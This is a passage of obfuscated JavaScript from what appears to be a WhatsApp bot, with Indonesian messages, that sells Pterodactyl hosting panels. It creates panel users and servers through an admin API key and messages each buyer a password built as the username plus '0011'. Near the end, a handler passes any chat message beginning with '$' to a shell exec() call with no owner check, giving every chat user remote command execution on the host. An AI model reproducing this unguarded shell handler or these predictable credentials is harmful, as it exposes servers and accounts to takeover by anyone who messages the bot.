              'egg': parseInt(_0x496ff5),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x559cdb,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "13240",
                'swap': 0x0,
                'disk': "13240",
                'io': 0x1f4,
                'cpu': "230"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x224f4c)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4df38a = await _0x265d30.json();
          if (_0x4df38a.errors) {
            return _0x427bb7(JSON.stringify(_0x4df38a.errors[0x0], null, 0x2));
          }
        }
        break;
      case "12gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x34e7b9 = _0x4ec028.split(',');
          if (_0x34e7b9.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x1bc051 = _0x34e7b9[0x0];
          let _0x339a34 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x34e7b9[0x1] ? _0x34e7b9[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0xb20f8c = _0x1bc051 + "12GB";
          let _0x258415 = global.eggsnya;
          let _0x11045d = global.location;
          let _0x44ea5e = _0x1bc051 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x339a34) {
            return;
          }
          let _0x38186e = _0x1bc051 + "0011";
          let _0x436e15 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x44ea5e,
              'username': _0x1bc051,
              'first_name': _0x1bc051,
              'last_name': _0x1bc051,
              'language': 'en',
              'password': _0x38186e
            })
          });
          let _0x1e07ce = await _0x436e15.json();
          if (_0x1e07ce.errors) {
            return _0x427bb7(JSON.stringify(_0x1e07ce.errors[0x0], null, 0x2));
          }
          let _0x553dc6 = _0x1e07ce.attributes;
          let _0x3ed639 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x258415, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x553dc6.id);
          ctf = "Hai @" + _0x339a34.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x553dc6.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x38186e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x339a34, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x138023 = await _0x3ed639.json();
          let _0x322eef = _0x138023.attributes.startup;
          let _0x5ca0b4 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xb20f8c,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x553dc6.id,
              'egg': parseInt(_0x258415),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x322eef,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "12240",
                'swap': 0x0,
                'disk': "12240",
                'io': 0x1f4,
                'cpu': "310"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x11045d)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xed2ebe = await _0x5ca0b4.json();
          if (_0xed2ebe.errors) {
            return _0x427bb7(JSON.stringify(_0xed2ebe.errors[0x0], null, 0x2));
          }
        }
        break;
      case "11gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x35b50a = _0x4ec028.split(',');
          if (_0x35b50a.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x28a335 = _0x35b50a[0x0];
          let _0xc03549 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x35b50a[0x1] ? _0x35b50a[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x490141 = _0x28a335 + "11GB";
          let _0xf70b9e = global.eggsnya;
          let _0x1e1e3b = global.location;
          let _0x2287aa = _0x28a335 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0xc03549) {
            return;
          }
          let _0x854ff2 = _0x28a335 + "0011";
          let _0x4e8713 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2287aa,
              'username': _0x28a335,
              'first_name': _0x28a335,
              'last_name': _0x28a335,
              'language': 'en',
              'password': _0x854ff2
            })
          });
          let _0x327c47 = await _0x4e8713.json();
          if (_0x327c47.errors) {
            return _0x427bb7(JSON.stringify(_0x327c47.errors[0x0], null, 0x2));
          }
          let _0x4f4b75 = _0x327c47.attributes;
          let _0x16c637 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xf70b9e, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x4f4b75.id);
          ctf = "Hai @" + _0xc03549.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x4f4b75.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x854ff2 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0xc03549, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x309643 = await _0x16c637.json();
          let _0x432d56 = _0x309643.attributes.startup;
          let _0x3c5f7c = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x490141,
              'description': "PANEL BY ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x4f4b75.id,
              'egg': parseInt(_0xf70b9e),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x432d56,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "11240",
                'swap': 0x0,
                'disk': "11240",
                'io': 0x1f4,
                'cpu': "280"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1e1e3b)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x57d2ce = await _0x3c5f7c.json();
          if (_0x57d2ce.errors) {
            return _0x427bb7(JSON.stringify(_0x57d2ce.errors[0x0], null, 0x2));
          }
        }
        break;
      case "totalfitur":
        {
          ngaceng = fs.readFileSync("./rabyyx.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x5dfaa1 => _0x5dfaa1.match(/case '([^']+)'/)[0x1]);
          _0x427bb7(" *Haii " + _0x24f9f6 + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + _0xd87340() + " Fitur*");
        }
        break;
      default:
    }
    if (_0x38db03.startsWith('$')) {
      exec(_0x38db03.slice(0x2), (_0x236c65, _0x5ed15a) => {
        if (_0x236c65) {
          return _0x427bb7(_0x236c65);
        }
        if (_0x5ed15a) {
          return _0x427bb7(_0x5ed15a);
        }
      });
    }
    if (_0x38db03.startsWith('>')) {
      if (!_0x3cc2ac) {
        return _0x427bb7(mess.only.owner);
      }
      try {
        let _0x465ce7 = await eval(_0x38db03.slice(0x2));
        if (typeof _0x465ce7 !== "string") {
          _0x465ce7 = require("util").inspect(_0x465ce7);
        }
        await _0x427bb7(_0x465ce7);
      } catch (_0x49c009) {
        _0x427bb7(String(_0x49c009));
      }
    }
  } catch (_0x1e4137) {
    console.log(_0x1e4137);
    _0x1acf89.sendMessage(owner + "@s.whatsapp.net", {
      'text': '' + util.format(_0x1e4137)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
